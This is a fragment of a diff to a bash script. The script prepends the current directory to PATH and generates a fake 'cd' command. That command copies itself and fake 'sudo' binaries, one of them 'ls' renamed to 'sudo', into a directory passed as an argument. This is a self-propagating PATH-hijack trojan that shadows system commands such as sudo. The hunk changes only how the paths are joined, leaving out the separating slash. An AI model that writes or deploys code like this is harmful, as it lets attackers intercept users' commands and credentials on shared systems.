@@ -3,9 +3,9 @@
 PATH=.:$PATH
 
 echo "#!/bin/bash" > cd
-echo "/usr/bin/cp cd $1/cd" >> cd
-echo "/usr/bin/cp sudo $1/sudo" >> cd
-echo "/usr/bin/cp ls $1/sudo" >> cd
+echo "/usr/bin/cp cd $1cd" >> cd
+echo "/usr/bin/cp sudo $1sudo" >> cd
+echo "/usr/bin/cp ls $1sudo" >> cd
 echo "/usr/bin/cd $1" >> cd
 chmod +x cd
 
